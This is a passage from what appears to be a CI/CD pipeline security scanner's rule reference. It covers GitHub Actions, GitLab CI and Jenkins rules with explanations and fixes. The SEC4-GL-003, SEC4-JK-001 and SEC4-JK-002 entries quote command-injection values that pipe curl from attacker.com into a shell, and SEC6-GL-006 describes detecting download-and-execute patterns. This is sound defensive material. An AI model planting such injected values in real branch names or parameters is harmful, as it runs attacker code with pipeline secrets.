- https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities

---

### CICD-SEC-9

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC9-GH-001 | HIGH | Binary or script downloaded without checksum verification |
| SEC9-GH-002 | HIGH | Mutable cache used in release or tag workflow (cache poisoning risk) |

#### SEC9-GH-001 — Binary or script downloaded without checksum verification

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-9

Workflow downloads a binary or script file using curl/wget and executes it without verifying a checksum (sha256sum, shasum, cosign, gpg). If the download source is compromised or the CDN is hijacked, arbitrary code runs in the pipeline with access to all secrets. This is the supply chain entry point pattern — verify every binary you execute.

**Remediation:** Always verify checksums after downloading:
curl -fsSL -o tool.tar.gz https://example.com/tool-v1.0.tar.gz
echo 'abc123def456...  tool.tar.gz' | sha256sum -c -
tar xzf tool.tar.gz

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09:_Improper_Artifact_Integrity_Validation

---

#### SEC9-GH-002 — Mutable cache used in release or tag workflow (cache poisoning risk)

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-9

A caching action (actions/cache, actions/setup-node, actions/setup-python, etc.) is used in a workflow triggered by a release event or tag push. Cache entries created in PR workflows are readable by privileged release workflows if the cache key matches. An attacker who can land a malicious PR can poison the cache and have it consumed by the release pipeline.

**Remediation:** Disable caching in release/tag workflows, or use a cache key that includes the full commit SHA to prevent cross-workflow cache reuse:
key: release-${{ github.sha }}-${{ hashFiles('**/package-lock.json') }}

**References:**
- https://woodruffw.github.io/zizmor/audits/cache-poisoning/

---


## GitLab CI Rules

### CICD-SEC-1

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC1-GL-001 | MEDIUM | Production environment deployment without manual approval gate |
| SEC1-GL-002 | HIGH | Security scanning job configured to allow failure (gate bypassed) |

#### SEC1-GL-001 — Production environment deployment without manual approval gate

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-1

A job targets a production/staging environment but does not require manual approval via 'when: manual'. Without a manual gate, any pipeline trigger (including a compromised branch push) causes immediate deployment to production. Human oversight is a critical last-resort control for privileged deployments.

**Remediation:** Add a manual approval gate to production deployment jobs:
deploy_production:
  environment: production
  when: manual
  only:
    - main

**References:**
- https://docs.gitlab.com/ci/environments/

---

#### SEC1-GL-002 — Security scanning job configured to allow failure (gate bypassed)

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-1

A job that runs security scanning tools (SAST, secret detection, dependency scanning, etc.) has 'allow_failure: true'. This silently bypasses the security gate — the pipeline passes even when scanning finds critical vulnerabilities. Teams typically set this during initial rollout and never remove it, permanently disabling the security enforcement the job was meant to provide.

**Remediation:** Remove 'allow_failure: true' from security scanning jobs to enforce the gate. If the scan is too noisy, tune the tool's configuration to suppress known false positives rather than silencing the entire job.

For initial rollout, use a separate 'informational' stage that does NOT gate the pipeline, alongside a stricter gated stage.

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-01:_Insufficient_Flow_Control_Mechanisms

---

### CICD-SEC-10

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC10-GL-001 | HIGH | CI_JOB_TOKEN or CI_JOB_JWT printed to job log |

#### SEC10-GL-001 — CI_JOB_TOKEN or CI_JOB_JWT printed to job log

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-10

A script block prints CI_JOB_TOKEN or CI_JOB_JWT to the job log. CI_JOB_TOKEN grants access to the GitLab API, container registry, and package registry with the permissions of the triggering project. CI_JOB_JWT is a short-lived OIDC token for cloud authentication. Printing either to the log — especially in public or internal projects — creates a window where anyone with log access can extract and reuse the token before it expires.

**Remediation:** Never print CI_JOB_TOKEN or CI_JOB_JWT. Pass the token directly to the command that needs it:

# BAD
- echo $CI_JOB_TOKEN

# GOOD — inline without printing
- docker login -u gitlab-ci-token -p $CI_JOB_TOKEN $CI_REGISTRY

# To check presence without printing:
- test -n "$CI_JOB_TOKEN" && echo 'Token is set' || exit 1

**References:**
- https://docs.gitlab.com/ee/ci/jobs/ci_job_token.html

---

### CICD-SEC-2

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC2-GL-001 | HIGH | Docker registry credentials defined in pipeline YAML (DOCKER_AUTH_CONFIG) |
| SEC2-GL-002 | HIGH | Docker-in-Docker service without TLS certificate directory — daemon socket exposed |

#### SEC2-GL-001 — Docker registry credentials defined in pipeline YAML (DOCKER_AUTH_CONFIG)

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-2

DOCKER_AUTH_CONFIG is defined in the pipeline YAML, embedding Docker registry credentials directly in version-controlled configuration. DOCKER_AUTH_CONFIG contains base64-encoded registry credentials — anyone with read access to the repository can decode and reuse them. Registry credentials should be stored as masked, protected CI/CD variables in GitLab project or group settings, never in the pipeline file.

**Remediation:** Move DOCKER_AUTH_CONFIG to GitLab CI/CD variables (Settings > CI/CD > Variables) with 'Masked' and 'Protected' flags enabled. The variable is injected at runtime without being stored in the pipeline YAML.

**References:**
- https://docs.gitlab.com/ee/ci/docker/using_docker_images.html#configure-a-registry-authentication-file

---

#### SEC2-GL-002 — Docker-in-Docker service without TLS certificate directory — daemon socket exposed

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-2

A job uses docker:dind (Docker-in-Docker) without setting DOCKER_TLS_CERTDIR to a non-empty path. Without TLS, the Docker daemon socket is exposed unencrypted on TCP port 2375, reachable by any process in the same runner network namespace. An attacker who can execute code in a co-tenant container or inject a malicious script step can connect to the unprotected daemon and escape to the runner host.

**Remediation:** Set DOCKER_TLS_CERTDIR to enable TLS for the DinD daemon:

variables:
  DOCKER_TLS_CERTDIR: '/certs'
  DOCKER_HOST: tcp://docker:2376
  DOCKER_TLS_VERIFY: '1'

services:
  - docker:dind

**References:**
- https://docs.gitlab.com/ee/ci/docker/using_docker_build.html#use-docker-in-docker

---

### CICD-SEC-4

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC4-GL-001 | HIGH | User-controlled GitLab CI variable used unquoted in shell script |
| SEC4-GL-002 | MEDIUM | Trigger job passes CI_JOB_TOKEN or sensitive variables to downstream pipeline |
| SEC4-GL-003 | HIGH | User-controlled ref/tag variable used unquoted in shell script |
| SEC4-GL-004 | MEDIUM | CI_PIPELINE_SOURCE used as sole access control gate — bypassable via API trigger |
| SEC4-GL-005 | HIGH | Merge request pipeline runs deploy or publish command — fork code executes with project secrets |

#### SEC4-GL-001 — User-controlled GitLab CI variable used unquoted in shell script

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-4

User-controlled GitLab predefined variables (CI_COMMIT_MESSAGE, CI_MERGE_REQUEST_TITLE, CI_MERGE_REQUEST_DESCRIPTION, CI_COMMIT_BRANCH, CI_MERGE_REQUEST_SOURCE_BRANCH_NAME) are used unquoted in shell scripts. These values are attacker-controlled — branch names and commit messages can contain shell metacharacters, enabling command injection when unquoted. Variables wrapped in double quotes are excluded (though sanitization is still recommended for values passed to subcommands).

**Remediation:** Always double-quote these variables in shell:
  - echo "$CI_COMMIT_MESSAGE"
For values passed to subcommands, sanitize using parameter expansion:
  - SAFE_BRANCH="${CI_COMMIT_BRANCH//[^a-zA-Z0-9._-]/}"

**References:**
- https://docs.gitlab.com/ci/variables/predefined_variables/

---

#### SEC4-GL-002 — Trigger job passes CI_JOB_TOKEN or sensitive variables to downstream pipeline

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-4

A trigger: job passes CI_JOB_TOKEN, CI_REGISTRY_PASSWORD, or CI_DEPLOY_PASSWORD as variables to a downstream pipeline. Downstream projects may have weaker access controls than the triggering project. If the downstream project is compromised, the upstream token/credentials are exposed.

**Remediation:** Use project access tokens with minimum required scopes for cross-project triggers instead of passing CI_JOB_TOKEN. Review downstream project permissions before passing any credential variables.

**References:**
- https://docs.gitlab.com/ci/triggers/

---

#### SEC4-GL-003 — User-controlled ref/tag variable used unquoted in shell script

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-4

CI_COMMIT_REF_NAME, CI_COMMIT_TAG, CI_BUILD_REF_NAME, or CI_MERGE_REQUEST_SOURCE_BRANCH_SHA are used unquoted in shell scripts. CI_COMMIT_REF_NAME is set from the branch or tag name triggering the pipeline — an attacker who can create branches can inject arbitrary shell via a crafted name (e.g. 'feature/$(curl attacker.com|sh)'). CI_COMMIT_TAG is attacker-controlled for projects that allow tag creation. CI_BUILD_REF_NAME is the deprecated alias for CI_COMMIT_REF_NAME and carries the same risk.

**Remediation:** Double-quote the variable or sanitize before use:
  - echo "$CI_COMMIT_REF_NAME"
  # For labels/tags passed to external tools, sanitize:
  - SAFE_REF="${CI_COMMIT_REF_NAME//[^a-zA-Z0-9._-]/}"
  - docker tag image:latest "image:$SAFE_REF"

**References:**
- https://docs.gitlab.com/ci/variables/predefined_variables/

---

#### SEC4-GL-004 — CI_PIPELINE_SOURCE used as sole access control gate — bypassable via API trigger

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-4

A rules:if expression gates a job solely on CI_PIPELINE_SOURCE == 'push'. CI_PIPELINE_SOURCE can also be 'api', 'trigger', 'schedule', or 'web', all of which can be initiated by anyone with the trigger token or appropriate API permissions. This check does not restrict who can run the job — only how the pipeline was started. Combine with branch protection checks to ensure only authorized pushes to protected branches run sensitive jobs.

**Remediation:** Combine pipeline source checks with branch protection:

rules:
  - if: '$CI_PIPELINE_SOURCE == "push" && $CI_COMMIT_BRANCH == "main"'
    when: on_success
  - when: never

For deploy jobs, also add a manual gate and ensure secrets are marked as Protected in Settings > CI/CD > Variables.

**References:**
- https://docs.gitlab.com/ee/ci/jobs/job_control.html#cicd-variable-expressions

---

#### SEC4-GL-005 — Merge request pipeline runs deploy or publish command — fork code executes with project secrets

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-4

A job restricted to merge request pipelines (only: [merge_requests]) contains deployment or publishing commands. When a contributor forks the project and opens an MR, GitLab runs a pipeline using the fork's code with the upstream project's unprotected CI/CD variables. If that pipeline deploys or publishes, the attacker's fork code executes with access to production credentials, container registry tokens, and cloud provider access keys.

**Remediation:** Do not run deploy or publish steps in MR pipelines. Gate those jobs on protected branches only:

deploy:
  rules:
    - if: '$CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"'
      when: on_success
    - when: never

Mark all production secrets as Protected in Settings > CI/CD > Variables so they are unavailable to fork pipelines.

**References:**
- https://docs.gitlab.com/ee/ci/pipelines/merge_request_pipelines.html

---

### CICD-SEC-5

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC5-GL-001 | MEDIUM | Deployment job targets an environment but lacks resource_group protection |

#### SEC5-GL-001 — Deployment job targets an environment but lacks resource_group protection

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-5

A job deploys to a named environment (production, staging, etc.) but does not define a 'resource_group:' key. Without resource_group, multiple pipelines can run concurrent deployments to the same environment — leading to race conditions, partial state, or the outcome of a newer deploy being overwritten by an older one. resource_group serialises access to a shared resource across pipelines, acting as a pipeline-level mutex for deployment targets.

**Remediation:** Add resource_group to serialise concurrent deployments:

deploy_production:
  environment: production
  resource_group: production   # only one deploy runs at a time
  when: manual
  script:
    - ./deploy.sh

**References:**
- https://docs.gitlab.com/ci/resource_groups/

---

### CICD-SEC-6

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC6-GL-006 | HIGH | wget/bash pattern or bash-subshell-curl in script block |
| SEC6-GL-007 | MEDIUM | Long-lived cloud credentials in GitLab CI configuration |
| SEC6-GL-008 | HIGH | Package manager registry or index URL overridden — dependency confusion risk |

#### SEC6-GL-006 — wget/bash pattern or bash-subshell-curl in script block

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-6

Script uses wget piped to shell, bash <(curl ...) subshell, or PowerShell iex() to download and execute remote code. These patterns bypass the separate download-then-verify workflow and execute remote code with no integrity check. Extends SEC6-GL-002 to cover patterns that rule misses.

**Remediation:** Download the script separately, verify its checksum, then execute:
  - wget -q -O install.sh https://example.com/install.sh
  - echo '<expected_sha256>  install.sh' | sha256sum -c -
  - bash install.sh

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/

---

#### SEC6-GL-007 — Long-lived cloud credentials in GitLab CI configuration

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-6

Pipeline configuration references long-lived cloud credentials (AWS access keys, GCP service account keys, Azure client secrets). These should be replaced with OIDC-based short-lived tokens via GitLab's ID token feature, which generates ephemeral credentials scoped to the pipeline.

**Remediation:** Use GitLab CI OIDC ID tokens for cloud authentication:
job:
  id_tokens:
    AWS_OIDC_TOKEN:
      aud: sts.amazonaws.com
  script:
    - aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --web-identity-token $AWS_OIDC_TOKEN

**References:**
- https://docs.gitlab.com/ci/cloud_services/

---

#### SEC6-GL-008 — Package manager registry or index URL overridden — dependency confusion risk

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-6

Pipeline configuration overrides the default package registry or index URL for pip (PIP_INDEX_URL, PIP_EXTRA_INDEX_URL), npm (NPM_CONFIG_REGISTRY), RubyGems (BUNDLE_MIRROR__RUBYGEMS__ORG), Go modules (GOPROXY), or Cargo. This is a known dependency confusion attack vector: an attacker who controls the mirror can serve malicious packages with the same names as your private dependencies. HTTP mirrors additionally allow MITM injection of malicious packages in transit.

**Remediation:** Verify any configured mirror is an internal, trusted proxy (Artifactory, Nexus) over HTTPS. Ensure private package namespaces cannot be shadowed by public packages with the same name.

For pip: prefer --index-url with a private proxy and --no-extra-index-url.
For npm: lock registries per-scope in .npmrc rather than a global env var override.

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03:_Dependency_Chain_Abuse

---

### CICD-SEC-7

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC7-GL-001 | MEDIUM | GitLab CI debug trace enabled — secrets printed to job logs |

#### SEC7-GL-001 — GitLab CI debug trace enabled — secrets printed to job logs

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-7

CI_DEBUG_TRACE or CI_DEBUG_SERVICES is set to true in the pipeline configuration. Debug trace prints every command, environment variable, and script expansion to job logs — this includes all CI/CD variables marked as masked or protected. Logs may be accessible to unauthorized users in public or internal projects.

**Remediation:** Remove CI_DEBUG_TRACE from the pipeline config. If debugging is needed temporarily, set it as a protected CI/CD variable in the project settings for a single run, then remove it.

**References:**
- https://docs.gitlab.com/ci/variables/#enable-debug-logging

---

### CICD-SEC-8

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC8-GL-001 | HIGH | GitLab CI image uses mutable :latest tag or has no version tag |
| SEC8-GL-002 | HIGH | External CI configuration included from project without pinned ref |
| SEC8-GL-003 | MEDIUM | Service container uses mutable :latest tag |

#### SEC8-GL-001 — GitLab CI image uses mutable :latest tag or has no version tag

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-8

A GitLab CI global or job-level `image:` references a Docker image with the ':latest' tag or no tag at all. In GitLab CI, the image is the execution environment for the job — all job scripts, secrets ($CI_JOB_TOKEN, masked variables, vault secrets), source code, and artefacts run inside this container. A mutable image tag means the execution environment can change silently between pipeline runs. If the upstream image is compromised, every subsequent pipeline run executes attacker code with full access to your CI secrets. Pin images to SHA256 digests to guarantee a reproducible, auditable environment.

**Remediation:** Pin the image to a SHA256 digest for a reproducible execution environment:
  image: ubuntu@sha256:abc123...   # was ubuntu:latest

Or specify an explicit version tag as a minimum:
  image: ubuntu:22.04

Find the current digest:
  docker pull ubuntu:latest && docker inspect ubuntu:latest | grep RepoDigests

For CI templates, consider using a private registry mirror with image scanning and approval workflows before promoting new versions.

**References:**
- https://docs.gitlab.com/ee/ci/docker/using_docker_images.html

---

#### SEC8-GL-002 — External CI configuration included from project without pinned ref

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-8

A GitLab CI `include: project:` directive pulls CI configuration from an external project without specifying a commit SHA as the `ref:`. Without a pinned ref, GitLab resolves the include against the default branch at pipeline creation time — any push to that branch immediately affects all pipelines that include it. A branch name or tag ref is mutable: the branch can be force-pushed, the tag can be recreated to point at different content. Pin to a full 40-character commit SHA so the included configuration is immutable and auditable.

**Remediation:** Pin the included configuration to a commit SHA:

include:
  - project: my-group/shared-ci
    ref: abc123def456abc123def456abc123def456abc1   # was: main
    file: /templates/default.yml

Find the current SHA:
  git ls-remote https://gitlab.com/my-group/shared-ci refs/heads/main

**References:**
- https://docs.gitlab.com/ee/ci/yaml/includes.html

---

#### SEC8-GL-003 — Service container uses mutable :latest tag

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-8

A job's services: block references a Docker image with the ':latest' tag. Service containers (databases, message brokers, etc.) run alongside the job and share its network namespace. A compromised service image can intercept queries, inject data, or escalate via shared volumes. Mutable ':latest' tags mean the service image can change silently between pipeline runs. Pin service images to specific version tags or SHA256 digests.

**Remediation:** Pin service images to explicit version tags or SHA256 digests:

services:
  - postgres:15.4        # was postgres:latest
  - redis:7.2-alpine     # was redis:latest
  - docker:24.0-dind     # was docker:dind or docker:latest

**References:**
- https://docs.gitlab.com/ee/ci/services/

---

### CICD-SEC-9

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC9-GL-001 | MEDIUM | Artifacts block without access restriction in potentially public project |
| SEC9-GL-002 | HIGH | Binary or script downloaded without checksum verification |
| SEC9-GL-003 | MEDIUM | Cache block without explicit key — cross-branch or cross-MR cache poisoning risk |

#### SEC9-GL-001 — Artifacts block without access restriction in potentially public project

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-9

Job produces artifacts without specifying 'access: private' or 'access: developer'. In public GitLab projects, artifacts are downloadable by anonymous users by default. Artifacts may contain build outputs, environment details, dependency lists, or log content that reveals internal infrastructure.

**Remediation:** Set explicit access control on artifact blocks:
artifacts:
  access: private
  paths:
    - dist/

**References:**
- https://docs.gitlab.com/ci/yaml/#artifactsaccess

---

#### SEC9-GL-002 — Binary or script downloaded without checksum verification

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-9

Pipeline downloads a binary or script file using curl/wget and executes it without verifying a checksum (sha256sum, shasum, cosign, gpg). Compromised download sources can deliver malicious payloads that run with full access to CI/CD variables and deployment credentials.

**Remediation:** Verify checksums after downloading binaries:
  - curl -fsSL -o tool.tar.gz https://example.com/tool-v1.0.tar.gz
  - echo 'abc123def456...  tool.tar.gz' | sha256sum -c -
  - tar xzf tool.tar.gz

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09:_Improper_Artifact_Integrity_Validation

---

#### SEC9-GL-003 — Cache block without explicit key — cross-branch or cross-MR cache poisoning risk

**Severity:** MEDIUM  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-9

A cache: block does not specify a key:. Without an explicit key GitLab uses a default cache key that may be shared across branches and merge requests, including those from forks. An attacker who can run a fork pipeline can poison the shared cache with malicious build artifacts, test fixtures, or executables that are later restored by the target branch's build.

**Remediation:** Set an explicit cache key scoped to the branch:

cache:
  key: $CI_COMMIT_REF_SLUG
  paths:
    - .cache/
    - node_modules/

For MR pipelines use a combined key:
  key: "$CI_COMMIT_REF_SLUG-$CI_JOB_NAME"

**References:**
- https://docs.gitlab.com/ee/ci/caching/#cache-key

---


## Jenkins Rules

### CICD-SEC-1

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC1-JK-001 | HIGH | Production deployment stage has no manual approval gate |
| SEC1-JK-002 | LOW | Declarative pipeline has no timeout — runaway build holds agents and credentials indefinitely |

#### SEC1-JK-001 — Production deployment stage has no manual approval gate

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-1

A Jenkins pipeline stage that appears to deploy to production (name contains 'prod', 'production', 'live', or 'release') does not contain an `input` step requiring manual approval before execution. Without an approval gate, any automated trigger — including a webhook from an attacker who has pushed a malicious commit or compromised a dependency — can promote code directly to production. Manual approval gates break the chain of fully automated privilege escalation from code push to production deployment.

**Remediation:** Add an input step before the deployment commands:

stage('Deploy to Production') {
    steps {
        input message: 'Deploy to production?',
              ok: 'Deploy',
              submitter: 'release-approvers'
        sh './deploy.sh prod'
    }
}

Use the `submitter` parameter to restrict who can approve. Consider adding a timeout to auto-abort unreviewed deployments:
  timeout(time: 1, unit: 'HOURS') { input 'Deploy?' }

**References:**
- https://www.jenkins.io/doc/pipeline/steps/pipeline-input-step/

---

#### SEC1-JK-002 — Declarative pipeline has no timeout — runaway build holds agents and credentials indefinitely

**Severity:** LOW  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-1

A Jenkins declarative pipeline does not contain any timeout() step or option. Without a timeout, a hung or looping build step holds the agent indefinitely, keeps credentials bound in memory via withCredentials blocks, and prevents other builds from running. A DoS via crafted code that hangs can block the entire CI pipeline. Timeouts are also a control against runaway deployments that partially apply infrastructure changes.

**Remediation:** Add a pipeline-level timeout in the options block:

pipeline {
    options {
        timeout(time: 30, unit: 'MINUTES')
    }
    ...
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/syntax/#options

---

### CICD-SEC-10

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC10-JK-001 | LOW | Declarative pipeline has no post { always { } } block — no guaranteed cleanup or audit trail |

#### SEC10-JK-001 — Declarative pipeline has no post { always { } } block — no guaranteed cleanup or audit trail

**Severity:** LOW  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-10

A Jenkins declarative pipeline does not contain a post { always { ... } } block. Without this, there is no guaranteed cleanup or audit logging step that runs regardless of whether the pipeline succeeds or fails. In security-sensitive pipelines, post { always } is used to delete temporary credential files from the workspace, report pipeline completion to a SIEM, send failure notifications, and clean up test deployments. The absence of cleanup creates a window where credential files or sensitive artifacts persist on the agent after a failed build.

**Remediation:** Add a post block with an always section:

pipeline {
    ...
    post {
        always {
            cleanWs()
            sh 'rm -f /tmp/*.pem /tmp/*.key'
        }
        failure {
            slackSend message: "Pipeline failed: ${env.BUILD_URL}"
        }
    }
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/syntax/#post

---

### CICD-SEC-2

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC2-JK-001 | HIGH | Credential stored as build parameter instead of Jenkins credential store |
| SEC2-JK-002 | CRITICAL | credentialsId bound from user-controlled build parameter — attacker selects credential |

#### SEC2-JK-001 — Credential stored as build parameter instead of Jenkins credential store

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-2

A Jenkins pipeline defines a `password` type build parameter. Password parameters are stored in the Jenkins job configuration as plain text (or weakly encrypted), visible in the build history, accessible via the Jenkins API to anyone with read access to the job, and logged in the parameter list for each build. Jenkins Credentials Binding is specifically designed for this purpose and provides proper encryption, access control, and audit logging. Use `string(credentialsId: '...')` or `usernamePassword(...)` bindings instead of password parameters.

## Jenkins Rules

### CICD-SEC-3

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC3-JK-001 | HIGH | Jenkins shared library loaded without commit-SHA pinning |
| SEC3-JK-002 | HIGH | @Grab annotation pulls dependency without explicit version |
| SEC3-JK-003 | HIGH | docker.image().inside() uses mutable :latest or untagged image |

#### SEC3-JK-001 — Jenkins shared library loaded without commit-SHA pinning

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-3

A Jenkins shared library is loaded via @Library without pinning to a full 40-character commit SHA. Without a SHA pin, Jenkins resolves the library against a branch head or tag at pipeline runtime — either can be updated or force-pushed by anyone with write access to the library repository. Shared library code executes on the Jenkins controller with the same trust level as the Jenkinsfile itself, giving an attacker who controls the library repo arbitrary code execution on your CI infrastructure.

**Remediation:** Pin shared libraries to a full commit SHA:
  @Library('my-shared-lib@abc123def456abc123def456abc123def456abc1') _

Find the current SHA:
  git ls-remote https://github.com/org/my-shared-lib refs/heads/main

Add a comment with the human-readable ref for maintainability:
  @Library('my-shared-lib@abc123def456...') _ // v2.1.0

**References:**
- https://www.jenkins.io/doc/book/pipeline/shared-libraries/

---

#### SEC3-JK-002 — @Grab annotation pulls dependency without explicit version

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-3

A Jenkins pipeline or shared library uses a `@Grab` annotation to pull a Groovy/Java dependency without specifying an explicit version. Unversioned `@Grab` annotations resolve to the latest available version at execution time — any new release of the dependency (including a compromised one) is automatically picked up on the next pipeline run. Dependencies fetched via @Grab are not subject to the same review as Jenkins plugins and execute directly in the Groovy runtime.

**Remediation:** Always specify an explicit version in @Grab annotations:

// BAD — resolves to latest at runtime
@Grab('org.apache.commons:commons-lang3')

// GOOD — pinned version
@Grab('org.apache.commons:commons-lang3:3.12.0')

Better still: declare dependencies in a build tool (Maven/Gradle) with a lockfile checked into the repository, and load them via a shared library rather than @Grab.

**References:**
- https://groovy-lang.org/grape.html

---

#### SEC3-JK-003 — docker.image().inside() uses mutable :latest or untagged image

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-3

A Jenkins pipeline calls docker.image().inside() with a Docker image referenced by ':latest' or no tag. The image becomes the execution environment for all commands inside the block, with access to bound credentials, workspace contents, and environment variables. A compromised upstream ':latest' gives an attacker arbitrary code execution inside the build environment. This is distinct from SEC8-JK-001 which covers `agent { docker { image '...' } }` — this rule covers the pipeline step pattern.

**Remediation:** Pin the image to a SHA256 digest:

// BAD
docker.image('ubuntu:latest').inside { sh 'make test' }

// GOOD
docker.image('ubuntu@sha256:abc123...').inside { sh 'make test' }

**References:**
- https://www.jenkins.io/doc/book/pipeline/docker/

---

### CICD-SEC-4

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC4-JK-001 | HIGH | User-controlled build parameter interpolated in shell command |
| SEC4-JK-002 | HIGH | SCM-controlled environment variable interpolated in shell command |
| SEC4-JK-003 | CRITICAL | Dynamic Groovy code evaluation via evaluate() or Eval |
| SEC4-JK-004 | HIGH | Jenkins input step without submitter restriction — any user can approve |
| SEC4-JK-005 | HIGH | PR author or URL environment variable used in shell — attacker-controlled content |

#### SEC4-JK-001 — User-controlled build parameter interpolated in shell command

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-4

A Jenkins pipeline passes a user-supplied build parameter (params.*) directly into a shell command via string interpolation. Build parameters can be set by anyone who can trigger a build — including anonymous users if the Jenkins instance is misconfigured, or any authenticated user if parameters are exposed via the API. Unsanitized parameter values in shell commands allow command injection: a value like `; curl attacker.com/shell.sh | bash` runs as part of the build with access to all bound credentials and workspace contents.

**Remediation:** Validate and sanitize build parameters before use in shell commands.
Prefer allowlists over blocklists:

// BAD — direct interpolation
sh "git checkout ${params.BRANCH_NAME}"

// GOOD — pass via environment variable (Jenkins doesn't expand env vars in sh)
withEnv(["BRANCH=${params.BRANCH_NAME}"]) {
    // Validate before use
    sh '''
        if ! echo "$BRANCH" | grep -qE '^[a-zA-Z0-9_/.-]+$'; then
            echo "Invalid branch name" && exit 1
        fi
        git checkout "$BRANCH"
    '''
}

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution

---

#### SEC4-JK-002 — SCM-controlled environment variable interpolated in shell command

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-4

A Jenkins pipeline interpolates an SCM-sourced environment variable (GIT_BRANCH, BRANCH_NAME, CHANGE_BRANCH, CHANGE_TITLE, CHANGE_AUTHOR, or a ghprb* variable) directly inside a shell command string. These variables are populated from the triggering SCM event and may contain attacker-controlled content — for example, a branch name crafted to contain shell metacharacters (`; curl attacker.com | bash`). Unlike params.*, these values arrive automatically from webhooks without any explicit user input step, making them easy to overlook.

**Remediation:** Sanitize or validate SCM-sourced variables before shell interpolation.
Pass them via environment variables rather than inline interpolation:

// BAD — direct interpolation
sh "git checkout ${env.GIT_BRANCH}"

// GOOD — pass via withEnv and validate
withEnv(["BRANCH=${env.GIT_BRANCH}"]) {
    sh '''
        if ! echo "$BRANCH" | grep -qE '^[a-zA-Z0-9_/.-]+$'; then
            echo "Suspicious branch name" && exit 1
        fi
        git checkout "$BRANCH"
    '''
}

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution

---

#### SEC4-JK-003 — Dynamic Groovy code evaluation via evaluate() or Eval

**Severity:** CRITICAL  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-4

A Jenkins pipeline uses Groovy's `evaluate()`, `Eval.me()`, `Eval.x()`, or `Eval.xy()` to execute dynamically-constructed code strings. These functions execute arbitrary Groovy code with the same privileges as the pipeline itself — typically with access to the Jenkins controller, all credentials, and the filesystem. If any part of the evaluated string originates from user input, build parameters, SCM content, or a network response, this is a direct code injection vulnerability. Even without user input, dynamic evaluation makes pipelines hard to audit and bypasses Jenkins script approval.

**Remediation:** Replace dynamic evaluation with explicit conditional logic or pre-approved shared library functions:

// BAD
evaluate("deploy${env.ENV_NAME}()")

// GOOD — explicit dispatch
if (env.ENV_NAME == 'prod') { deployProd() }
else if (env.ENV_NAME == 'staging') { deployStaging() }

If evaluate() is unavoidable, ensure the input is a hard-coded string that never incorporates user-controlled data.

**References:**
- https://www.jenkins.io/doc/book/managing/script-approval/

---

#### SEC4-JK-004 — Jenkins input step without submitter restriction — any user can approve

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-4

